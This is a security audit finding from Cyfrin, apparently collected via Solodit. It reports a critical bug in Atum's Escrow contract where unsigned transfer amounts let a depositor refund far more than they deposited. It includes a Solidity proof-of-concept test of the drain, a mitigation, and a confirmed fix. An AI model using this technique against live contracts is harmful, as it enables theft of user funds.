---
affected_contracts: []
derives_from: []
id: solodit-cyfrin-2025-08-14-cyfrin-atum-evm-contracts-v2-0-0-0
ingested_at: '2026-10-04T10:45:09Z'
protocol_category: []
published_at: '2025-08-14T00:00:00Z'
related_swc: []
severity: Critical
source: solodit
source_url: https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-08-14-cyfrin-atum-evm-contracts-v2.0.md
tags:
- firm:cyfrin
- report:2025-08-14-cyfrin-atum-evm-contracts-v2-0
title: Permissionless attacker can completely drain the `Escrow` contract of tokens
vuln_class: []
---

# Permissionless attacker can completely drain the `Escrow` contract of tokens

_Section severity (from Solodit section header): Critical_  
_Audit firm: Cyfrin_  
_Source report: [2025-08-14-cyfrin-atum-evm-contracts-v2.0.md](https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-08-14-cyfrin-atum-evm-contracts-v2.0.md)_

---

**Description:** Permissionless attacker can completely drain the `Escrow` contract of tokens by:
* when signing everything they set themselves as the `releaser`
* after signing everything but before calling `Escrow::deposit`, they change `transferDetails.requestedAmount = 1`
* then call `Escrow::deposit` which tricks the protocol into only transferring 1 wei while having full amount in `permit.permitted.token` recorded as the deposit amount in `s_activeDeposits`
* since the attacker set themselves as the `releaser`, they can immediately sign and call `Escrow::refund`
* `Escrow` will then refund them the inflated amount stored in `s_activeDeposits` for their deposit, even though they actually only deposited 1 wei
* Rinse & repeat to drain the contract of all tokens

**Proof of Concept:** Add PoC to `test/helpers/Escrow.depositFlow.t.sol`:
```solidity
    function test_attacker_drains_escrow_via_deposit_refund() public {
        // @audit first mint `s_escrow` DEPOSIT_AMOUNT tokens to simulate another
        // previous user's deposit
        s_token.mint(address(s_escrow), DEPOSIT_AMOUNT);

        // Setup permit data, transfer details, and witness
        (
            ISignatureTransfer.PermitTransferFrom memory permit,
            ISignatureTransfer.SignatureTransferDetails memory transferDetails,
            IEscrow.DepositWitness memory depositWitness
        ) = _setup_permit_transferDetails_witness(
            // @audit depositor sets themselves as the releaser
            REQUEST_ID, address(s_token), DEPOSIT_AMOUNT, address(s_escrow), reserver, depositor, 0
        );

        // Generate signature
        bytes memory depositSignature = _setup_signature(permit, depositWitness, s_permit2, address(s_escrow), depositorPrivateKey);

        // even though everything was signed above using DEPOSIT_AMOUNT,
        // depositor then changes this value to 1 wei
        transferDetails.requestedAmount = 1;

        // Execute deposit and verify results
        uint256 depositorBalanceBefore = s_token.balanceOf(depositor);
        uint256 escrowBalanceBefore = s_token.balanceOf(address(s_escrow));
        vm.prank(address(depositor));
        bytes32 depositId = s_escrow.deposit(permit, transferDetails, depositor, depositWitness, depositSignature);

        assertEq(
            s_token.balanceOf(depositor), depositorBalanceBefore - 1, "Depositor balance should decrease by 1"
        );
        assertEq(
            s_token.balanceOf(address(s_escrow)), escrowBalanceBefore + 1, "Escrow balance should increas by 1"
        );

        // Verify deposit was stored correctly
        IEscrow.DepositInfo memory depositInfo = s_escrow.getDepositInfo(depositId);
        assertEq(depositInfo.depositor, depositor, "Stored depositor should match");
        assertEq(depositInfo.reserver, reserver, "Stored reserver should match");
        assertEq(depositInfo.releaser, depositor, "Stored releaser should match");
        assertEq(depositInfo.settler, address(0), "Settler should be unset initially");

        // @audit It actually stored DEPOSIT_AMOUNT even though only 1 wei was transferred!
        assertEq(depositInfo.amount, DEPOSIT_AMOUNT, "Stored amount should match");

        // @audit Depositor immediately creates refund witness and signature; the depositor
        // does this since they set themselves as the releaser when making the deposit!
        IEscrow.RefundWitness memory refundWitness =
            IEscrow.RefundWitness({depositId: depositId, deadline: block.timestamp + 1 hours});

        bytes memory refundSignature = _setup_refund_signature(refundWitness, address(s_escrow), depositorPrivateKey);

        // Check balances before refund
        depositorBalanceBefore = s_token.balanceOf(depositor);
        escrowBalanceBefore = s_token.balanceOf(address(s_escrow));

        // @audit Execute refund as depositor
        vm.prank(address(depositor));
        vm.expectEmit(true, true, false, true);
        emit IEscrow.Refunded(depositId, depositor, DEPOSIT_AMOUNT);
        s_escrow.refund(refundWitness, refundSignature);

        // Verify token transfer back to depositor
        assertEq(
            s_token.balanceOf(depositor),
            depositorBalanceBefore + DEPOSIT_AMOUNT,
            "Depositor should receive refunded tokens"
        );
        assertEq(
            s_token.balanceOf(address(s_escrow)), escrowBalanceBefore - DEPOSIT_AMOUNT, "Escrow balance should decrease"
        );
        // Verify deposit status
        assertTrue(_depositWasCompleted(depositId), "Deposit should be marked as completed");

        // @audit in the final state:
        // Escrow contract has 1 wei left
        assertEq(s_token.balanceOf(address(s_escrow)), 1);

        // the user has 2*DEPOSIT_AMOUNT - 1 (they doubled their tokens by draining Escrow)
        assertEq(s_token.balanceOf(depositor), 2*DEPOSIT_AMOUNT - 1);
    }
```

**Recommended Mitigation:** Ideally if any deposit input amounts were changed, the signature verification should always fail. Another option is to enforce inside `Escrow::deposit` that `permit.permitted.amount == transferDetails.requestedAmount` or simply to have `Escrow::deposit` create the `SignatureTransferDetails` struct instead of receiving it as input.

**Atum:**
Fixed in commit [5bd59b4](https://github.com/Atum-Labs/evm-contracts/commit/5bd59b4e03e2881df8a980c4fcb0e21620238c6e) by having `Escrow::deposit` create the `transferDetails`.

**Cyfrin:** Verified.

\clearpage
